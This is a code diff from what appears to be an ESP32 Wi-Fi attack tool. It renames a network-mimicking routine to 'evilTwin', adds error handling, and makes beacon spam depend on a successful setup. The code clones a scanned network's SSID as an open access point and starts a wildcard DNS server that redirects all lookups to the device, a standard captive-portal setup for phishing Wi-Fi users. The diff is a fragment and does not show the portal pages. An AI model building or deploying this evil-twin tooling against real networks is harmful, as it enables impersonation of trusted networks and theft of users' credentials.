@@ -75,8 +75,7 @@ void loop(){
                 findNewNetworks();
                 break;
             case 2:
-                MimicNetwork();
-                attacking = true;
+                evilTwin();
                 break;
             case 3:
                 Serial.print("Enter custom SSID: ");
@@ -85,9 +84,10 @@ void loop(){
                 attacking = true;
                 break;
             case 4:
-                beaconSpamSetup();
-                beaconSpamAttack = true;
-                attacking = true;
+                if(beaconSpamSetup()){
+                    beaconSpamAttack = true;
+                    attacking = true;
+                }
                 break;
             default:
                 Serial.println("Enter a Valid Answer: ");
@@ -128,7 +128,12 @@ void findNewNetworks(){
     networks.printNetworks();
 }
 
-void MimicNetwork(){
+void evilTwin(){
+    if(networks.getSize() == 0){
+        Serial.println("No networks observed.");
+        return;
+    }
+
     
     Serial.print("\nWhich network # to mimic: ");
     uint8_t networkNum;
@@ -137,32 +142,30 @@ void MimicNetwork(){
 
     if(networkNum >= 0 && networkNum <= networks.getSize()){
         SSID = *networks.getSSID(networkNum-1);
-        createAP();
+        attacking = createAP();
     }else{
         Serial.println("Invalid network number.");
     }
-    
-    
 }
 
-void createAP(){
+bool createAP(){
     Serial.print("Creating network: ");
     Serial.println(SSID);
     
     if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
         Serial.println("Failed to configure AP");
-        return;
+        return false;
     }
     
     //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
     if (!WiFi.softAP(SSID)) {
         Serial.println("Failed to start AP");
-        return;
+        return false;
     }
 
     if(!dnsServer.start(DNS_PORT, "*", local_IP)){
         Serial.println("Failed to start DNS Server");
-        return;
+        return false;
     }
 
     delay(500);
@@ -181,6 +184,8 @@ void createAP(){
     //server.onNotFound(handleNotFound);
     server.begin();
     apStarted = true;
+    
+    return true;
 }
 
 
